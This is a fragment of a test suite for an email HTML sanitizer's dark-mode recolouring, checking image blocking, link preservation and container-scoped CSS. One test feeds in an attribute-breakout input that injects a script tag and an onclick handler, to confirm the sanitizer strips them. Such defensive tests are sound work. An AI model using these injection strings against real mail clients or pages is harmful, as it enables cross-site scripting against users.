  it("leaves images, links and the withheld-image promise exactly as they were", () => {
    const html = '<img src="https://t.example/p.gif" style="background:#fff"><a href="https://x.example" style="color:#1a73e8">x</a>';
    const plain = sanitizeMailHtml(html, blocked);
    const dark = sanitizeMailHtml(html, { ...blocked, recolour });
    expect(dark.blockedRemote).toBe(plain.blockedRemote);
    expect(dark.html).toContain('data-wn-blocked-src="https://t.example/p.gif"');
    expect(dark.html).not.toMatch(/\ssrc="http/);
    expect(dark.html).toContain('href="https://x.example"');
    expect(dark.html).not.toMatch(/filter|invert/);
  });

  it("cannot be used to smuggle markup through a colour", () => {
    const html = '<td bgcolor="&quot;><script>x</script>" style="color:red&quot; onclick=&quot;x">t</td>';
    const out = clean(html, { recolour });
    expect(out).not.toContain("<script");
    // The same escaped attributes as without recolouring: only the colour token moved.
    expect(out.replace(/color:#[0-9a-f]{6}/, "color:red")).toBe(clean(html));
  });

  it("has a dark baseline that only ever names the container", () => {
    const css = inlineEmailDarkCss(recolour);
    for (const rule of css.split("\n")) expect(rule.startsWith("[data-wn-email][data-wn-dark]")).toBe(true);
    expect(css).toContain(`color: ${recolour.ink}`);
    expect(css).toContain(`background: ${recolour.surface}`);
  });
});
